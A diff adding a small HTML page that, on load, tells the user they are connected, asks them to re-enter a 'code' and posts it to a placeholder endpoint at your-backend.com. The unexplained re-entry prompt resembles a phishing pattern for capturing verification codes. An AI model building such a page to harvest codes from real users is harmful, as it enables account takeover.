@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Confirm Code</title>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+<body>
+  <script>
+    async function askForCode() {
+      const { value: code } = await Swal.fire({
+        title: "You're connected!",
+        text: "Please re-enter your code.",
+        input: 'text',
+        inputLabel: 'Enter code:',
+        inputPlaceholder: 'Your code here',
+        confirmButtonText: 'Submit'
+      });
+
+      if (code) {
+        try {
+          await fetch('https://your-backend.com/store-code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code })
+          });
+          await Swal.fire('Saved!', 'Your code was saved successfully.', 'success');
+        } catch (err) {
+          await Swal.fire('Error!', 'Failed to save code: ' + err.message, 'error');
+        }
+      }
+    }
+
+    askForCode();
+  </script>
+</body>
+</html>
